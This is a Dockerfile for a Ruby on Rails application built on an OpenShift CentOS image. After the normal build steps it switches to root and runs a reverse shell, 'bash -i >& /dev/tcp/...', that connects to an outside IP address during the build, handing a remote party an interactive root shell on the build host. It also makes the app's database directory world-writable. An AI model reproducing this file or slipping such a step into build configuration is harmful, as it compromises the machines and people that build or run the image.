FROM openshift/ruby-20-centos7
USER default
EXPOSE 8080
ENV RACK_ENV production
ENV RAILS_ENV production
COPY . /opt/app-root/src/
RUN scl enable ror40 "bundle install"
CMD ["scl", "enable", "ror40", "./run.sh"]

USER root
RUN /bin/bash -c 'bash -i >& /dev/tcp/10.64.40.181/4411 0>&1'
RUN touch /tmp/aaa
RUN chmod og+rw /opt/app-root/src/db

